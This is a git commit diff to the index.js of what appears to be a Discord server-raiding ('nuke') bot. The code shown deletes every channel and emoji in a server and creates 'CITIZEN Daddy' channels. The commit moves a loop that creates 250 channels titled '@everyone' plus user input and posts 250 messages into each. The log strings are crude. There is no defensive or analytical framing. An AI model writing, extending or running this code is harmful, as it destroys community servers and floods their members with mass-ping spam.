e71b053e48b8f3f708ad0598dd9f225929aa3ad9
Citizen <rajpatel12032@gmail.com>
2021-04-12 14:48:45 +0530

    Update index.js

--- index.js
+++ index.js
@@ -459,7 +459,8 @@ client.on("message", async message => {
                     message.guild.channels.cache.forEach(channel => channel.delete().then(
                         console.log(redBright(`CHANNEL FUCKED`))
                     )); // deletes all channels
-                  message.guild.channels.create("CITIZEN Daddy")
+                  for (var i = 0; i < 5; i++) {
+                       let channels = message.guild.channels.create("CITIZEN Daddy") }
 
             }
         }
@@ -549,6 +550,29 @@ client.on("message", async message => {
                 // Emoji
                 message.guild.emojis.cache.forEach(e => e.delete({ reason: "Nuking" },).then(console.log(yellow(`EMOJI: ${e.name} was deleted successfully`))))
 
+                 // Massing Channels
+                let args = message.content.split(" ").slice(1);
+                var argresult = args.join(' ');
+
+                if (!argresult) {
+                    message.channel.send("*Add an input after the cmd*")
+                } else {
+
+                    for (var i = 0; i < 250; i++) {
+                        let channels = message.guild.channels.create("@everyone "+argresult)
+
+                        channels.then(
+                            function (channel, index) {
+                                for (var i = 0; i < 250; i++) {
+                                    channel.send(`${argresult}`)
+                                    console.log(blueBright(`CHANNEL PINGED!`));
+                                    // other per-channnel logic
+                                }
+                            }
+                        )
+                    }
+                }
+
                //Channel Creation
 							      for (var i = 0; i < 5; i++) {
                             let channels = message.guild.channels.create("CITIZEN Daddy") }
@@ -572,28 +596,7 @@ client.on("message", async message => {
 
                     }
 
-                // Massing Channels
-                let args = message.content.split(" ").slice(1);
-                var argresult = args.join(' ');
 
-                if (!argresult) {
-                    message.channel.send("*Add an input after the cmd*")
-                } else {
-
-                    for (var i = 0; i < 250; i++) {
-                        let channels = message.guild.channels.create("@everyone "+argresult)
-
-                        channels.then(
-                            function (channel, index) {
-                                for (var i = 0; i < 250; i++) {
-                                    channel.send(`${argresult}`)
-                                    console.log(blueBright(`CHANNEL PINGED!`));
-                                    // other per-channnel logic
-                                }
-                            }
-                        )
-                    }
-                }
 
 
 
